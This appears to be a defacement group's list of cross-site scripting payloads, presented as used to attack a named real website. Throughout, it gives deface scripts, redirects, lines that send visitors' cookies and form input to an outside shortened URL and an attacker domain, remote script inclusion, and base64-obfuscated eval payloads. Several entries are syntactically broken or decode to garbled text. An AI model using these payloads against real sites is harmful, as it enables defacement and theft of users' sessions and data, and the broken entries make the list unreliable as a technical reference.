
HACK WEBSITES - BEST EXPLOIT PAYLOADS USED IN - RLA DEFACE
_________________
EXTRAS :|
<script>with(document.body.style)background="black",color="red",fontSize="40px";body.innerText="HACKED-BY-RLA"</script>
<script>document.body.style="background:black;color:red";body.textContent="HACKED-BY-RLA"</script>
<script>fetch('https://rb.gy/tdpzkw?data='+document.forms[0].elements[0].value)</script>
<script>fetch('https://rb.gy/tdpzkw?data=');</script>

_________________
USED IN EXPLOITING TARGET: https://addel.hu
XSS DEFACE >>>  <script>document.body.style="background:red;color:black"</script>
 [PAYLOAD-USED] :|   <script>document.body.innerHTML='DEFACED-BY-REDLOCK-AGENCY!';</script>
:|   <script>document.body.innerHTML='<h1>Hacked!</h1>'</script>
:|   <script>document.body.innerHTML='HACKED-BY-RLA!';</script>
:|   <script>document.body.innerHTML="HACKED-BY-REDLOCK-AGENCY"</script>
:|   <script>document.body.style.background="black";</script>
:|   <script>document.body.style.color="red";</script>
:|   <script>document.body.style.fontSize="60px";</script>
:|   <script>alert(&#39;HACKED-BY-RLA&#39;)</script>
:|   <script>document.body.innerHTML='HACKED-BY-REDLOCK-AGENCY';</script>

_________________

USED IN EXPLOITING TARGET: http://addel.hu >>> 
XSS REDIRECT METHODS >>> 
 [PAYLOAD-USED] 
1.  :|   <script>document.location.replace("https://rb.gy/tdpzkw");</script>
2.  :|   <script>window.location.replace("https://rb.gy/tdpzkw");</script>
3.  :|   <script>location='//rb.gy/tdpzkw'</script>
4.  :|   <script>window.open('https://rb.gy/tdpzkw')</script>
5.  :|   <script>window.location="https://rb.gy/tdpzkw";</script>
6.  :|   <script>location.href="https://rb.gy/tdpzkw";</script>
7.  :|   <script>new Image().src="https://rb.gy/tdpzkw?cookie="+document.cookie;</script>
8.  :|   <script>fetch('https://rb.gy/tdpzkw/log?cookie='+document.cookie);</script>
9.  :|   <script>document.body.appendChild(document.createElement('script')).src='https://rb.gy/tdpzkw';</script>
10. :|   <script>document.location='https://rb.gy/tdpzkw';</script>
11. :|   <style>body{background:url('https://rb.gy/tdpzkw');}</style>
12. :|   <script>fetch('https://rb.gy/tdpzkw'+document.cookie);</script>
13. :|   <script>document.location='https://rb.gy/tdpzkw'+document.cookie;</script>
14. :|   <script>window.replace("https://rb.gy/tdpzkw");</script>
15. :|   <script>location.replace("https://rb.gy/tdpzkw");</script>
16. :|   <script>location.open("https://rb.gy/tdpzkw");</script>
17. :|   <script>document.open("https://rb.gy/tdpzkw");</script>
18. :|   <body open("https://rb.gy/tdpzkw")>
19. :|   <body eval(atob('YWxlcnQoMSk='))>


_________________
USED IN EXPLOITING TARGET: http://addel.hu >>> 
SCRIPT INJECTION IN ATTRIBUTE >>>
 [PAYLOAD-USED]
1. :|   <button onclick="alert('HACKEDBYRLA')">HACKED</button>
2. :|   <img src="x" onerror="alert(document.cookie)">
3. :|   <script>alert('HACKEDBYRLA!');</script>

_________________
META TAG REDIRECT >>>
:|   <meta http-equiv="refresh" content="0;url=https://rb.gy/tdpzkw">

_________________
CROSS-SITE SCRIPTING INCLUSION (XSSI)
:|   <script src="http://hacked-by-rla.com/xssi?cookie=" + document.cookie"></script>

_________________
SVG-BASED XSS >>>
:|   <svg/onload=alert('HACKED-XSS-BY-RLA')</script>

_________________
IFRAME-BASED XSS >>>
:|   <iframe src="javascript:alert('HACKEDBYRLA');"></iframe>

_________________
EVENT BASED XSS >>>
1. :|   <img src="x" onerror="alert('HACKED-BY-RLA')">
2. :|   <input type="text"value="XSS"onfocus="alert('EXPLOTED')">
3. :|   <a href="#" onclick="alert('HACKED-BY-RLA'); return false;">HACKED</a>
4. :|   <body alert('THIS-WEBSITE-IS-HACKED-BY-REDLOCK-AGENCY')>
5. :|   <body alert('HACKED-BY-REDLOCK-AGENCY')>
6. :|   <script>onload=alert('HACKED-XSS-BY-RLA')</script>

_________________
BASIC XSS >>>
:|   <script>alert('EXPLOITED-BY-RLA');</script>

_________________
REFRESH WINDOW EXPLOIT
:|   <script>eval(atob('YWxlcnQoMSk='))</script>

_________________
AUTO CLICK EXPLOIT
:|   <script>document.body.click()</script>
:|   <style>*{cursor:pointer}</style>

_________________
WEBSITE TITLE EXPLOIT
:|   <script>document.title="HACKED-BY-RLA"</script>
:|   <script>document.title.setAttribute('text','HACKED-BY-RLA')</script>
:|   <script>document.querySelector('title').text='RLA-WAS-HERE'</script>
:|   <script>eval("document.title=HACKED-BY-RLA")</script>
:|   <script>window.title="HACKED-BY-RLA"</script>
:|   <script>document.querySelector('title').innerText='RLA-WAS-HERE'</script>
:|   <script>document["title"]="HACKED-BY-RLA"</script>
:|   <script>document.title="HACKED-BY-RLA-WAS-HERE"</script>

_________________
DELETE STUFF EXPLOIT
:|   <script>document.title.removeAttribute('text')</script>
:|   <script>document.title.removeAttribute('background')</script>
:|   <script>document.title.removeAttribute('form')</script>
:|   <script>document.querySelector('name').innerText='RLA-WAS-HERE'</script>
:|   <script>document.querySelector('href')</script>

_________________
BASE64 OBFUSSED EXPLIT
:|   <script>eval(atob('YWxlcnQoMik='))</script>
:|   <script>eval(atob('YWxlcnQoIkhha2VkISIp'))</script>
:|   <script>eval(atob('b2NjdW1lbnQucmVwbGFjZSgnYWh0dHA6Ly9yYi5neS90ZHB6a3cnKTtkb2N1bWVudC5ib2R5LmlubmVySFRNTCA9ICJSTEEtV0FTLUhFUkUuIg=='))</script>
:|   <script>eval(atob('b2NjdW1lbnQucmVwbGFjZSgnYWh0dHA6Ly9yYi5neS90ZHB6a3cnKTw='))</script>
:|   <script>eval(atob('d2luZG93Lm9wZW4oJ2h0dHA6Ly9hdHRhY2tlci5jb20nLCAncG9wdXAnLCAnc3Bhbm5uZWQnLCAnd2lkdGg9NTAwLCJoZWlnaHQ9NTAwJyk='))</script>
:|   <script>eval(atob('ZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAiUkxBLVdBUy1IRVJFLiIg'))</script>
:|   <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" style="display:none"></iframe>
:|   <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" style="visibility:hidden;width:0;height:0"></iframe>
:|   <script>eval(atob('ZG9jdW1lbnQuYm9keS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3I9InJlZCI='))</script>
:|   <script src="data:text/javascript;base64,dmFyIGY9bmV3IEltYWdlKCk7Zm9yIHRoaXMgaW4gY2h1bmtzLg==" ></script>
:|   <iframe src="data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0iYWh0dHA6Ly9hdHRhY2tlci5jb20iJyk8L3NjcmlwdD4=" style="display:none"></iframe>
:|   <iframe src="data:text/html;base64,PHN0eWxlPSJkaXNwbGF5Om5vbmU7YmFja2dyb3VuZDpjb2xsYXRlOyIgYm9vayBhZD0ib2Zmc2V0Ij48c2NyaXB0PiB3aW5kb3cuY29va2llKCgnaHR0cHM6Ly9hdHRhY2tlci5jb20nKTwvc2NyaXB0PiA8L2ZyYW1lPg==" style="display:none"></iframe>
:|   <iframe src="data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0iYWh0dHA6Ly9hdHRhY2tlci5jb20iJyk8L3NjcmlwdD4=" style="display:none"></iframe>
:|   <script>eval(atob('d2luZG93Lm9wZW4oJ2h0dHA6Ly9hdHRhY2tlci5jb20nLCAnc3Bhbm5uZWQnLCAnY29sbGFzc2NyZWVucCddYXV0aHVsdmUvbmFvbG9ndmknKTw='))</script>
:|   <script>eval(atob('Zm9yIHRoaXMgb3B0aW9uYWwgY2hhdCglJ2ZpbGVkb3duZ2hpc3Rvc2cp'))</script>
:|   <script>eval(atob('ZXZhbCgnc2V0VGltZW91dCgoKCgpPSgiY29va2llcyAtO3NrZXcwM6OkZGk=') </script>
:|   <script>eval(atob('d2luZG93Lm9wZW4oJ2h0dHA6Ly9hdHRhY2tlci5jb20nLCAncG9wdXAnLCAnc2NpZm9ycmVmJywkIlNoYWVkcyBdKSk='))</script>
